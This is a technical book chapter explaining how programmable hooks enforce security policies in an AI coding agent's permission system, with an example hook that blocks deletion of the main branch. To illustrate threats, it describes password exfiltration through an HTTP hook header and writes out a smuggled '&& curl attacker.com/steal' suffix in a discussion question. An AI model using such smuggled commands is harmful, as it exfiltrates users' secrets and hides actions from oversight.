# Chapter 11: Hooks -- Programmable Security Policies

> If your team mandates "never delete the main branch," how do you express that in allow/deny rules?

```
        tool_use request
             │
      ┌──────▼──────┐
      │  Permission  │
      │  Pipeline    │
      │      │       │
      │ ★PreToolUse ★│
      │ ★  Hooks    ★│     ◄── Focus of this chapter
      │      │       │
      │  Rule Engine  │
      │      │       │
      │  Classifier   │
      │      │       │
      │ ★Permission ★│
      │ ★Req. Hooks ★│
      │      │       │
      │  User Dialog  │
      └──────────────┘
```

## 11.1 The Ceiling of Hard-Coded Rules

The permission system dissected in the previous two chapters has a fundamental limitation: all rules are **declarative**.

You can say "allow Bash(git *)" or "deny the entire Bash Tool," but you cannot express "only deny git push operations targeting the main branch," nor "all SQL operations must go through an audit service."

These requirements share a common trait: they need to **understand the operation's content**, not merely match a Tool name or command prefix. One team prohibits publishing packages to the public npm registry; another requires all database migrations to be reviewed by a DBA -- the diversity of these policies far exceeds the expressive power of predefined rules.

Hooks were created for precisely this purpose: a programmable policy extension point that lets users participate in permission decisions with their own code.

If deny/allow rules are traffic signals, then Hooks are traffic officers -- officers can make judgment calls based on the situation on the ground that signals cannot express.

## 11.2 Four Hook Types: From Shell Scripts to Autonomous Validators

The Hook configuration schema module defines four Hook types, each tailored to different complexity requirements.

### Command Hook

The most direct form -- executing a shell command. The Hook process receives JSON-formatted event data via stdin and returns a JSON-formatted decision result via stdout.

The `shell` field supports bash and powershell. `timeout` limits execution time, preventing the Hook from blocking indefinitely. `once` marks a one-shot Hook -- it is automatically removed after execution, suitable for initialization scenarios. `async` supports background execution -- the Hook does not block the main flow. `asyncRewake` goes further: it runs in the background, but if the exit code is 2, it wakes the model to handle a blocking error reported by the Hook.

### Prompt Hook

Uses an independent LLM to evaluate an operation. The `$ARGUMENTS` placeholder is replaced with the Hook input JSON.

This is essentially "using AI to audit AI" -- a lightweight model can perform rapid semantic checks. For instance, "is this shell command trying to read environment variables and send them to an external endpoint" -- this intent-level judgment is beyond pure pattern matching, but a small model can deliver a reasonable answer within a few hundred milliseconds.

The `model` field allows specifying which model to use, defaulting to a lightweight fast model so as not to consume the main loop model's resources.

### HTTP Hook

POSTs the event to a remote URL. Suitable for integrating with enterprise security audit systems, compliance checking services, and SIEM platforms.

`allowedEnvVars` is a carefully designed security boundary: only explicitly listed environment variables are interpolated in headers. Unlisted `$VAR` references resolve to empty strings.

Why is this restriction needed? Consider this scenario: a malicious project-level Hook configuration sets up an HTTP Hook with the header `"Authorization": "Bearer $DATABASE_PASSWORD"`. Without an `allowedEnvVars` allowlist, this Hook could exfiltrate the database password to an attacker's server via the HTTP request. The allowlist mechanism ensures only variables the developer has explicitly authorized are resolved.

### Agent Hook

Launches a full Agent to perform validation. The key difference from a Prompt Hook is that a Prompt Hook makes a single LLM call, while an Agent Hook can perform multi-turn reasoning and call Tools.

Suitable for complex validation logic: "verify that unit tests pass" requires actually running the test command; "check whether code conforms to the team style guide" requires reading configuration files and comparing. These exceed the capability of a single LLM call.

### Commonality: `if` Pre-Filtering

All four types support an `if` field as a pre-filter. It uses the same syntax as permission rules (e.g., `Bash(git *)`), performing pattern matching before the Hook process starts.

This is an important performance optimization. A Command Hook without `if` filtering spawns a subprocess on every Tool call; with `if: "Bash(git push *)"` filtering, only commands matching `git push` trigger the Hook subprocess. For a typical Agent session (which may involve dozens of Tool calls), this filter avoids substantial unnecessary process creation overhead.

## 11.3 The Hook Response Protocol: A Standardized Decision Interface

Hooks influence system behavior by returning JSON via stdout. The Hook type definition module defines the complete response schema.

### Synchronous Response

Several key fields in the synchronous response schema:

`continue` -- setting it to false stops the Agent from continuing execution. Combined with the `stopReason` field, it can provide a reason for stopping.

`decision` -- `approve` or `block`, directly affecting the permission decision. Combined with the `reason` field, it explains the rationale to the user.

`suppressOutput` -- hides the Hook's own stdout output, preventing audit logs or debug information from interfering with the Agent's conversation context.

`systemMessage` -- displays a warning message to the user. This does not enter the Agent's conversation context; it is only shown as a UI hint.

### PreToolUse-Specific Output

For `PreToolUse` events, the Hook can return three additional fields:

`permissionDecision` (allow/deny/ask) -- directly overrides the Tool self-check's permission determination. `updatedInput` -- modifies the Tool's input parameters. `additionalContext` -- injects additional context information for the Agent.

`updatedInput` is the most powerful capability: a security policy Hook can automatically add `--no-force` to a `git push` command; an audit Hook can automatically append `LIMIT 1000` to a SQL command. Tool behavior is modified "in flight," invisible to both the Agent and the user.

### PermissionRequest-Specific Output

For `PermissionRequest` events, the Hook can return structured allow or deny decisions.

An allow decision can carry `updatedPermissions` -- updating permission rules while allowing the operation. For example, "allow this operation, and add this command prefix to the session-level allowlist."

A deny decision can carry `interrupt: true` -- not only denying the current operation but also aborting the entire Agent through the abort controller. This is an "emergency brake" -- when the Hook detects a severe security threat (such as a suspected prompt injection attack), it can immediately halt everything.

### Asynchronous Response

Returning `{async: true}` indicates the Hook continues executing in the background without blocking the main flow. An optional `asyncTimeout` field sets the background execution timeout. Suitable for audit log writing, asynchronous notification dispatch, and other scenarios that do not require waiting for a result.

## 11.4 Two Integration Points Between Hooks and the Permission System

Hooks intervene in the permission pipeline at two distinctly different moments.

### PreToolUse: Inserting a Veto into the Decision Chain

PreToolUse Hooks fire before Tool execution. The `permissionBehavior` field in the Hook result type can be set to `allow`, `deny`, `ask`, or `passthrough`.

If the Hook says deny, the operation is rejected even if both the Tool self-check and the rule engine approved it -- this gives external policy systems a "single-veto power."

If the Hook says allow, it accelerates through subsequent stages. However, safetyCheck still cannot be bypassed, because Step 1g executes after Hook intervention -- this guarantees that even if a compromised Hook claims allow, modifications to `.git/` still require human confirmation.

### PermissionRequest: Racing with the User Dialog

When a permission decision is `ask` and a user dialog needs to be displayed, PermissionRequest Hooks **run concurrently** with the dialog. Recall the `resolveOnce` mechanism from Chapter 9 -- the Hook is one of the participants in that race.

The coordinator handling module shows the execution order in automation-first scenarios: run the Hook first (fast, local), then the classifier (slow, inference), and only fall back to the dialog if both fail.

In interactive scenarios, the Hook launches asynchronously, racing in parallel with the UI dialog, ML classifier, Desktop Bridge, and other parties. The atomic `claim()` operation ensures only the first responder wins.

This race semantics yields an important experience characteristic: if your Hook can make a decision within 100ms, the user never even sees the permission dialog. The Hook's existence is transparent to the user -- it only accelerates decisions, never adds latency.

## 11.5 Configuration: Three-Layer Sources, Loosely Coupled Integration

Hooks are configured in `settings.json`. The Hook configuration schema module defines the top-level structure: a partial record keyed by Hook event name, with matcher arrays as values.

Each matcher contains an optional `matcher` (Tool name filter) and a `hooks` array. `matcher` performs first-level filtering (only trigger for specific Tools), and `if` performs second-level filtering (only start the Hook for calls matching the pattern). Two-level filtering ensures Hooks execute only at the moments they are truly needed.

Configuration supports three source layers:

- **User level** (`~/.agent/settings.json`): global policies applying to all projects.
- **Project level** (`.agent/settings.json`): team policies committed to version control.
- **Local level** (`.agent/settings.local.json`): personal preferences not checked into the repository.

Loose coupling is a core design principle of the Hook system. Hooks communicate with the main process through a JSON protocol over stdin/stdout, with no dependency on any programming language or runtime. A Python script, a Node.js program, a curl call, or even a jq pipeline -- anything that can read stdin and write stdout can serve as a security policy.

## 11.6 Practical Example: Preventing Deletion of the Main Branch

Let us tie all the concepts together. Suppose a team needs to prohibit any git operation that deletes the main branch.

Create `.agent/hooks/protect-main.py`:

```python
#!/usr/bin/env python3
import json, sys

data = json.load(sys.stdin)
cmd = data.get("tool_input", {}).get("command", "")

dangerous = ["branch -d main", "branch -D main",
             "push origin :main", "push origin --delete main"]

if any(p in cmd for p in dangerous):
    json.dump({"decision": "block",
               "reason": "Team policy: main branch deletion forbidden."
              }, sys.stdout)
else:
    json.dump({"decision": "approve"}, sys.stdout)
```

Configure it in `.agent/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "python3 .agent/hooks/protect-main.py",
        "if": "Bash(git *)",
        "timeout": 5,
        "statusMessage": "Checking branch protection..."
      }]
    }]
  }
}
```

Execution flow: Agent requests `git branch -D main` -> PreToolUse event fires -> `matcher: "Bash"` matches -> `if: "Bash(git *)"` matches -> Hook process starts, stdin receives JSON -> Python detects dangerous pattern -> stdout outputs block decision -> Permission engine receives deny -> Agent sees "Permission denied: Team policy..." and chooses an alternative approach.

The entire process is transparent to the Agent -- it knows only that it was denied, not whether the denial came from a Hook, the user, or the classifier.

## 11.7 Security Design: The Hook Itself Must Not Become an Attack Surface

The Hook system itself requires security mechanisms; otherwise, it becomes a new attack vector.

**Trust domain isolation.**
Hook scripts must be explicitly configured by the user in `settings.json`, not dynamically created by the Agent. When project settings containing hooks are first loaded, the user must confirm through a trust dialog. This prevents the "malicious repository pre-plants a backdoor Hook in `.agent/settings.json`" attack.

**Timeout enforcement.**
Every Hook has a timeout limit (the `timeout` field), preventing malicious or buggy Hooks from permanently blocking the Agent. Hooks without a configured timeout use the system default.

**Managed policy precedence.**
In enterprise environments, Hooks from the `policySettings` source have the highest priority. The managed Hooks exclusive toggle prevents non-managed Hooks from executing -- ensuring only Hooks vetted by the enterprise security team can run. The global disable toggle disables all Hooks in an emergency -- the ultimate safety valve.

**Output validation.**
Hook JSON output is strictly validated through Zod schemas. Invalid responses are safely ignored rather than causing system crashes. This is a textbook example of defensive programming -- never trust external input, even when that "external" is a Hook script the user wrote themselves.

**Environment variable isolation.**
The HTTP Hook's `allowedEnvVars` uses an allowlist mechanism. If `DATABASE_PASSWORD` is not listed, even if the header configuration references `$DATABASE_PASSWORD`, it resolves to an empty string. An allowlist, not a denylist -- this directional choice is critical.

## 11.8 27 Event Types: Covering the Agent Lifecycle

The backbone of the Hook system is 27 event types (defined in the Agent SDK type module). The three core events directly related to permissions -- `PreToolUse`, `PermissionRequest`, `PermissionDenied` -- have already been discussed in detail.

The remaining events cover every aspect of the Agent lifecycle:

**Session level:**
`SessionStart`/`SessionEnd` (startup and shutdown), `Setup` (first-time installation), `ConfigChange` (configuration changes).

**Tool level:**
`PostToolUse`/`PostToolUseFailure` (post-execution / post-failure), `CwdChanged` (working directory change), `FileChanged` (file modifications).

**Agent level:**
`SubagentStart`/`SubagentStop` (sub-Agent management), `Stop`/`StopFailure` (Agent stopping).

**Collaboration level:**
`TeammateIdle` (team member idle), `TaskCreated`/`TaskCompleted` (task lifecycle).

**Context level:**
`PreCompact`/`PostCompact` (before/after context compaction), `InstructionsLoaded` (instructions loading complete).

This full lifecycle coverage means Hooks are not merely an extension of permissions -- they are a general-purpose programmable interface for Agent behavior. You can use a `PostToolUse` Hook to automatically run a linter after every code modification, a `SessionStart` Hook to initialize the project environment, or a `Stop` Hook to generate a session summary report.

## 11.9 Summary: From Predefined Rules to Programmable Policies

The Hook system elevates the permission model from "declarative rules" to "programmable policies." Its design elegance is evident at three levels:

**Progressive enhancement.**
Without any Hooks configured, the system runs as usual. Adding one Hook enhances only a single decision point. Hooks are purely additive and do not alter baseline behavior.

**Race semantics.**
PermissionRequest Hooks race in parallel with the user dialog and ML classifier. If the Hook responds faster than the user, the user never notices the Hook's existence.

**Loosely coupled protocol.**
The stdin/stdout JSON protocol means any programming language can write a Hook. Enterprise security teams can write high-performance audit services in Go; individual developers can implement simple pattern matching in three lines of bash.

From a broader perspective, the Hook system completes an important feedback loop: users are not merely passive beneficiaries of the permission system but active participants in policy making. When built-in rules are insufficient, users express their security intent through their own code -- that is the power of programmable security policies.

---

**Discussion Questions**

1. PreToolUse Hooks can return `updatedInput` to modify Tool input. If a malicious project-level Hook quietly modifies Bash command content (e.g., appending `&& curl attacker.com/steal`), can existing security mechanisms detect this? How would you design protection?

2. An Agent Hook launches a full Agent to validate operations. But this validation Agent itself needs to call Tools (e.g., reading files to check test results). Do its Tool calls also require permission checks? If so, could this lead to infinite recursion?

3. The Hook's `if` field uses the same matching syntax as permission rules. But this syntax has limited expressive power -- it cannot match "a git push containing the `--force` flag." If you were to extend `if`'s expressive power, would you choose regular expressions, JSONPath, or another approach? What are the security and performance tradeoffs of each?

---

[← Back to Contents](../README.md)
